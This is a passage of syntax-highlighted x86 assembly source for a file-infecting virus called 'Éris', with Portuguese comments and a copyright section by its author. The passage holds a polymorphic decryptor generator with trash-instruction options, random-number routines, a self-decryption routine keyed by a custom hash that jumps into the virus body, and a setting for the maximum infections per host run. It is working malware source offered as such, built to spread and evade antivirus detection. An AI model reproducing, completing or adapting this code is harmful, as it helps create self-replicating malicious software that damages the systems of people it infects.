</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">39h</span><span class="sc0">          </span><span class="sc1">;  " XXX [ECX+EDI] "</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@escreve2</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@2_esi</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc0">          </span><span class="sc1">;  " XXX [ECX+ESI] "</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@escreve2</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@2_ebx</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">          </span><span class="sc1">;  " XXX [ECX+EBX] "</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@escreve2</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@2_edx</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">          </span><span class="sc1">;  " XXX [ECX+EDX] "</span><span class="sc0">

</span><span class="sc5">@escreve2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F6E2h</span><span class="sc0">       </span><span class="sc1">;  " LOOP (DISTANCIA) "</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">popfd</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@muda_loop</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc0">         </span><span class="sc1">;  Se não teve AAA então poe um NOP</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@termina_poly</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@muda_loop</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc5">bye</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@termina_poly</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; Recupera chave...</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Recupera EAX (Endereço do código mutado...)</span><span class="sc0">

</span><span class="sc5">fim_fen</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Cria_Fenotipo</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; ---- Randomiza ----</span><span class="sc0">

</span><span class="sc5">rand</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                       </span><span class="sc1">; Salva EDX...</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rndseed</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; MOV EAX, SEED</span><span class="sc0">
</span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">05F38h</span><span class="sc0">                 </span><span class="sc1">; SBB EAX, 5F38 ( EAX = EAX - 5F38h - C )</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D6h</span><span class="sc0">                        </span><span class="sc1">; SALC ( Se C = 0, AL = 0 | Se C = 1, AL= 0FFh )</span><span class="sc0">
</span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                       </span><span class="sc1">; IMUL EAX,EDX ( EAX = EAX * EDX )</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                    </span><span class="sc1">; XOR EAX,EDX</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rndseed</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; XOR SEED, EAX</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                    </span><span class="sc1">; EDX = 0</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; EAX = EAX / [ESP-4]  (EDX = Resto)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                    </span><span class="sc1">; EAX = EDX</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                        </span><span class="sc1">; Recupera EDX...</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                          </span><span class="sc1">; Retorna...</span><span class="sc0">

</span><span class="sc1">; ---- Gera semente para randomização ----</span><span class="sc0">

</span><span class="sc5">seed</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                       </span><span class="sc1">; Salva EDX !</span><span class="sc0">
</span><span class="sc6">rdtsc</span><span class="sc0">                          </span><span class="sc1">; RDTSC (pega time-stamp da cpu em EDX:EAX, 586+)</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">                    </span><span class="sc1">; XOR EDX,ESP</span><span class="sc0">
</span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                       </span><span class="sc1">; EAX = EAX * EDX</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                    </span><span class="sc1">; XOR EAX,EDX</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                        </span><span class="sc1">; Recupera EDX !</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rndseed</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; XOR SEED, EAX</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                            </span><span class="sc1">; Retorna...</span><span class="sc0">

</span><span class="sc5">Area_Fim</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;               Código que numca será encriptado</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;         Rotina de descriptografia simples (polimorfica)</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; OBS: Aqui você observa apenas uma "fôrma" para o código do decriptador,</span><span class="sc0">
</span><span class="sc1">; esta "fôrma" jamais será executada, apenas serviu como base para que</span><span class="sc0">
</span><span class="sc1">; que eu moldasse o engine de polimorfismo.</span><span class="sc0">


</span><span class="sc5">S_Dec</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

            </span><span class="sc1">; trash ou NÃO ?</span><span class="sc0">
</span><span class="sc6">pushfd</span><span class="sc0">              </span><span class="sc1">; PUSHFD ou PUSHAD</span><span class="sc0">
            </span><span class="sc1">; trash ou NÃO ?</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">              </span><span class="sc1">; PUSHAD ou TRASH</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">n_Comp</span><span class="sc0">      </span><span class="sc1">; ECX = Tamanho da area</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">012345678h</span><span class="sc0">  </span><span class="sc1">; Modificador de ECX</span><span class="sc0">
            </span><span class="sc1">; ADD/XOR/SUB/OR imm32</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">012345678h</span><span class="sc0">  </span><span class="sc1">; EAX = Chave 32 bits</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@1</span><span class="sc0">             </span><span class="sc1">; CALL [Distancia]</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">                 </span><span class="sc1">; TRASH ou não ?</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">                 </span><span class="sc1">; TRASH ou não ?</span><span class="sc0">
</span><span class="sc5">@1</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; POP [REG]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">7Fh</span><span class="sc0">         </span><span class="sc1">; ADD [REG],[Distancia entre os codigos]</span><span class="sc0">

</span><span class="sc5">loop_dec</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">aaa</span><span class="sc0">                 </span><span class="sc1">; Modificador 1 (AAA) ou não ?</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; Modificador 2 (XOR)</span><span class="sc0">

</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">        </span><span class="sc1">; Modificador 3 (RCL/RCR imm8)</span><span class="sc0">

</span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Criptografia ADD/SUB/ADC/SBB/XOR [REG+ECX],EAX</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_dec</span><span class="sc0">       </span><span class="sc1">; Loop</span><span class="sc0">

</span><span class="sc5">S_Dec</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;             Rotina de descriptografia complexa</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">DeCrypt</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta0</span><span class="sc0">        </span><span class="sc1">; Delta offset ;)</span><span class="sc0">
</span><span class="sc5">delta0</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">07Fh</span><span class="sc0">          </span><span class="sc1">; Tamanho do buffer (maximo: 7Fh)</span><span class="sc0">
</span><span class="sc5">k_tam</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">012345678h</span><span class="sc0">    </span><span class="sc1">; Ponteiro para local de dados imutáveis</span><span class="sc0">
</span><span class="sc5">k_buf</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Hash64</span><span class="sc0">        </span><span class="sc1">; Calcula Hash64 em (EAX:EBX)...</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">n_Area</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">   </span><span class="sc1">; ECX = Tamanho da area a ser decriptada</span><span class="sc0">

</span><span class="sc5">dec_l</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">         </span><span class="sc1">; RCL EAX,CL</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">no_dec</span><span class="sc0">         </span><span class="sc1">; Bit = 0 ? Não decripta...</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">Area</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">-</span><span class="sc5">delta0</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Decripta...</span><span class="sc0">
</span><span class="sc5">no_dec</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; XOR Chave, Modificador</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">dec_l</span><span class="sc0">         </span><span class="sc1">; Loop ;D</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">           </span><span class="sc1">; AL = Maximo de infecções sendo executado de um hospedeiro</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Eris</span><span class="sc0">           </span><span class="sc1">; Executa o virus...</span><span class="sc0">

</span><span class="sc5">DeCrypt</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;                Calcula Hash64 de uma string</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Entrada:</span><span class="sc0">
</span><span class="sc1">; Arg1 = Ponteiro para string</span><span class="sc0">
</span><span class="sc1">; Arg2 = Tamanho da string</span><span class="sc0">
</span><span class="sc1">; Saida:</span><span class="sc0">
</span><span class="sc1">; EAX = Parte alta do Hash64</span><span class="sc0">
</span><span class="sc1">; EBX = Parte baixa do Hash64</span><span class="sc0">

</span><span class="sc5">Hash64</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc5">MAGIC</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc3">"CaoS"</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ESI = Ponteiro para string</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ECX = Tamanho da string</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; EAX = 0</span><span class="sc0">
</span><span class="sc6">cdq</span><span class="sc0">             </span><span class="sc1">; EDX = 0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">MAGIC</span><span class="sc0">   </span><span class="sc1">; EBX = MAGIC</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; D = 0 (mostra a direção em que ESI deve caminhar)</span><span class="sc0">

</span><span class="sc5">nextByte</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; Carrega ESI em AL, incrementa ESI</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">        </span><span class="sc1">; DL = 8</span><span class="sc0">

</span><span class="sc5">nextBit</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; RCR AL, 1</span><span class="sc0">
</span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">; SBB EBX, ECX</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">; XOR EAX, EBX</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; NOT EAX</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; EDX--</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">nextBit</span><span class="sc0">     </span><span class="sc1">; Tem bits ainda ? Vamos ao proximo...</span><span class="sc0">

</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">      </span><span class="sc1">; ROL EBX, CL</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; ECX--</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">nextByte</span><span class="sc0">    </span><span class="sc1">; Tem bytes ainda ? Vamos ao proximo...</span><span class="sc0">

</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">; EAX = EAX / EBX</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D6h</span><span class="sc0">         </span><span class="sc1">; SALC</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">; SUB EAX, EBX</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">     </span><span class="sc1">; RCL EAX, 0Dh</span><span class="sc0">
</span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">; EBX = EBX + EDX + C</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; NOT EDX</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">; XOR EAX, EDX</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">; Retorna...</span><span class="sc0">

</span><span class="sc5">Hash64</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  EOV - EOV - EOV - EOV - EOV - EOV - EOV - EOV - EOV - EOV - EOV</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Eris_Fim</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">newsection</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;        Seção de informações adicionais e/ou copyright</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">cpysection</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'Xtra-NFO'</span><span class="sc0">

</span><span class="sc1">; Copyright</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Éris - by cH4R_"</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc2">22h</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Nada é verdadeiro, tudo é permitido."</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">22h</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">

</span><span class="sc1">; Xtra nfo</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"I love you Djinn, my sweet."</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"I love you M'Luccian, my little."</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">cpysection</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">inicio</span></div></body>
</html>
